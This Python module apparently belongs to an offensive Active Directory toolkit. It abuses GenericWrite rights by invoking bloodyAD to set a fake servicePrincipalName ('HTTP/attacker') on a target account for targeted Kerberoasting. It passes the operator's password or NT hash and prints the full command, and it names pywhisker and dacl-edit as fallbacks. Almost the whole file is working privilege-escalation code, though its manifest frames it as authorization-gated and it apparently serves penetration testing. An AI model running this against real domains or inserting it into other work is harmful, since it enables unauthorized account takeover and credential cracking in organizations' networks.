"""GenericWrite abuse — modify target attributes for escalation."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.acl.generic_write.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ad_object_modification"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1222.001"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target_dn = getattr(args, "target_dn", None)
    target_account = getattr(args, "target_account", None)
    dc_ip = getattr(args, "dc_ip", None)

    print("[*] GenericWrite Abuse")
    print("[*] Target: {}".format(target_account or target_dn or "unspecified"))

    import subprocess
    import shutil
    bloodyad = shutil.which("bloodyAD") or shutil.which("bloodyad")
    if bloodyad:
        cmd = [bloodyad, "-d", cred.domain, "-u", cred.username or ""]
        if cred.password:
            cmd += ["-p", cred.password]
        elif cred.nthash:
            cmd += ["--hashes", f":{cred.nthash}"]
        if dc_ip:
            cmd += ["--host", dc_ip]
        cmd += ["set", "object", target_account or "", "servicePrincipalName",
                "-v", "HTTP/attacker"]
        print("[*] Setting SPN for targeted Kerberoast via GenericWrite")
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] bloodyAD not found")
    print("[*] Alternative: use dacl-edit or pywhisker for GenericWrite exploitation")
    return 1
